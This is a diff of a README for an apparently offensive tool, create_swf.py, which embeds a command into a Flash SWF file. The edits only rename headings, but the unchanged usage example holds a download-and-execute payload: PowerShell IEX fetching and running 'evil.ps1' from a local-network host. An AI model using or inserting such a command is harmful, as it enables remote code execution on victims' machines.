@@ -12,15 +12,16 @@ Usage:
 
 ```python create_swf.py <command> <output file name>```
 
-Example:
+Example Usage:
 
 ```python create_swf.py "powershell.exe IEX (iwr 'http://192.168.0.32/evil.ps1')" test.swf```
   
 
-## Example Usage
+
+## Example
 
 
-Example command to download a file:
+Command to download a file:
 
 ![alt text](https://github.com/kphongagsorn/adobe-flash/blob/master/images/cmd.png)
 
